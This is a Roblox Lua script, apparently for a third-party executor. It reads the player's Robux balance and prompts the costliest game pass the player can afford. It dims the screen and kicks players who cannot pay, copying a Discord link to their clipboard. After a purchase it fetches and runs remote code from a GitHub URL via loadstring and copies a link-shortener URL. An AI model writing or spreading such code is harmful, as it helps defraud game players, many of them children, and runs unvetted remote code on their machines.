local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer
local paidGamePassId = 1106755338 -- Paid GamePass ID
local paidWithPremiumGamePassId = 1105218641 -- Paid with Premium GamePass ID
local requiredRobuxPaid = 100 -- Minimum Robux for Paid pass
local requiredRobuxPaidWithPremium = 750 -- Minimum Robux for Paid with Premium pass
local maxRobux = 1000000000 -- Maximum Robux limit (1 billion)
local speedCoilId = 13600173502 -- Speed Coil Item ID
local speedCoilPrice = 5 -- 5 Robux for Speed Coil
local speedBoost = 34 -- Speed boost amount
local speedBoostDuration = 9 -- Duration of the speed boost
local speedCooldown = 2 -- Cooldown in seconds

-- Create UI cover
local gui = Instance.new("ScreenGui")
gui.Parent = player:FindFirstChildOfClass("PlayerGui") or Instance.new("PlayerGui", player)
gui.ResetOnSpawn = false

local coverFrame = Instance.new("Frame")
coverFrame.Parent = gui
coverFrame.Size = UDim2.new(1, 0, 1, 0)
coverFrame.BackgroundColor3 = Color3.new(0, 0, 0)
coverFrame.BackgroundTransparency = 0.5

local promptFrame = Instance.new("Frame")
promptFrame.Parent = coverFrame
promptFrame.Size = UDim2.new(0.3, 0, 0.4, 0)
promptFrame.Position = UDim2.new(0.35, 0, 0.3, 0)
promptFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
promptFrame.BorderSizePixel = 0
promptFrame.Visible = false
promptFrame.ClipsDescendants = true

local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0.1, 0)
uiCorner.Parent = promptFrame

local promptLabel = Instance.new("TextLabel")
promptLabel.Parent = promptFrame
promptLabel.Size = UDim2.new(1, 0, 0.3, 0)
promptLabel.Position = UDim2.new(0, 0, 0, 0)
promptLabel.BackgroundTransparency = 1
promptLabel.Text = "Loading Game Pass..."
promptLabel.TextColor3 = Color3.new(1, 1, 1)
promptLabel.TextScaled = true

local purchaseButton = Instance.new("TextButton")
purchaseButton.Parent = promptFrame
purchaseButton.Size = UDim2.new(0.8, 0, 0.25, 0)
purchaseButton.Position = UDim2.new(0.1, 0, 0.7, 0)
purchaseButton.Text = ""
purchaseButton.TextScaled = true
purchaseButton.BackgroundColor3 = Color3.fromRGB(0, 176, 255)
purchaseButton.TextColor3 = Color3.new(1, 1, 1)
purchaseButton.Visible = false

local uiCornerButton = Instance.new("UICorner")
uiCornerButton.CornerRadius = UDim.new(0.2, 0)
uiCornerButton.Parent = purchaseButton

coverFrame.Active = true
coverFrame.ZIndex = 2

-- Function to get user's Robux balance
local function getUserRobux()
    local success, robux = pcall(function()
        return player:GetRobuxBalanceAsync()
    end)
    return success and robux or 0
end

-- Function to check if the player has enough Robux for "Paid" pass
local function checkRobuxForPaid()
    local robux = getUserRobux()
    if robux >= requiredRobuxPaid and robux <= maxRobux then
        -- If player has enough Robux, directly prompt game pass purchase for Paid
        MarketplaceService:PromptGamePassPurchase(player, paidGamePassId)
    else
        setclipboard("https://discord.gg/uQ2gqY8mAA")
        player:Kick("Not enough Robux for the Paid Game Pass. The latest version link has been copied to your clipboard.")
    end
end

-- Function to check if the player has enough Robux for "Paid with Premium" pass
local function checkRobuxForPaidWithPremium()
    local robux = getUserRobux()
    if robux >= requiredRobuxPaidWithPremium and robux <= maxRobux then
        -- If player has enough Robux, directly prompt game pass purchase for Paid with Premium
        MarketplaceService:PromptGamePassPurchase(player, paidWithPremiumGamePassId)
    else
        setclipboard("https://discord.gg/uQ2gqY8mAA")
        player:Kick("Not enough Robux for the Paid with Premium Game Pass. The latest version link has been copied to your clipboard.")
    end
end

-- Function to buy the Speed Coil (if Robux < 100)
local function autoPurchaseSpeedCoil()
    local robux = getUserRobux()
    if robux >= speedCoilPrice and robux <= maxRobux then
        MarketplaceService:PromptPurchase(player, speedCoilId)
    else
        print("Not enough Robux for Speed Coil.")
    end
end

-- Function to give the Speed Coil tool and boost the player's speed
local function giveSpeedCoil()
    -- Create the Speed Coil tool
    local speedCoil = Instance.new("Tool")
    speedCoil.Name = "SpeedCoil"
    speedCoil.RequiresHandle = true
    speedCoil.Parent = player.Backpack
    
    local handle = Instance.new("Part")
    handle.Name = "Handle"
    handle.Size = Vector3.new(1, 1, 1)
    handle.Position = player.Character.HumanoidRootPart.Position
    handle.Parent = speedCoil
    
    -- Speed boost logic when the player clicks the tool
    local function onActivated()
        if player.Character and player.Character:FindFirstChild("Humanoid") then
            local humanoid = player.Character.Humanoid
            humanoid.WalkSpeed = humanoid.WalkSpeed + speedBoost  -- Increase speed
            
            -- Wait for the boost duration
            wait(speedBoostDuration)
            
            -- Reset speed after the duration
            humanoid.WalkSpeed = humanoid.WalkSpeed - speedBoost
            
            -- Cooldown before next use
            wait(speedCooldown)
        end
    end
    
    -- Connect the activation to the onActivated function
    speedCoil.Activated:Connect(onActivated)
end

-- Function to load the script
local function loadScript()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/khen791/script-khen/refs/heads/main/frost%20remake%20by%20khen.lua", true))()
end

-- Function to copy the link to the clipboard
local function copyToClipboard()
    setclipboard("https://work.ink/19k/mfih65rt")
end

-- Function to auto-purchase based on the player's Robux balance
local function autoPurchase()
    local robux = getUserRobux()

    if robux >= requiredRobuxPaidWithPremium then
        -- Auto purchase Paid with Premium game pass
        checkRobuxForPaidWithPremium()
    elseif robux >= requiredRobuxPaid then
        -- Auto purchase Paid game pass
        checkRobuxForPaid()
    elseif robux >= speedCoilPrice and robux < 100 then
        -- Auto purchase Speed Coil for players with less than 100 Robux
        autoPurchaseSpeedCoil()
    else
        print("Not enough Robux for any purchases.")
    end
end

-- Automatically trigger purchase if the player meets the criteria
autoPurchase()

-- Detect purchase completion for Game Passes
MarketplaceService.PromptGamePassPurchaseFinished:Connect(function(userId, passId, purchased)
    if userId == player.UserId then
        if passId == paidGamePassId or passId == paidWithPremiumGamePassId then
            if purchased then
                -- Purchase is successful, load script
                promptLabel.Text = "Thanks for your purchase! Script is loading..."
                task.wait(2)
                loadScript()
                copyToClipboard()
                coverFrame:Destroy()
            else
                promptLabel.Text = "You must purchase the game pass to play!"
                task.wait(2)
                coverFrame:Destroy()
            end
        end
    end
end)
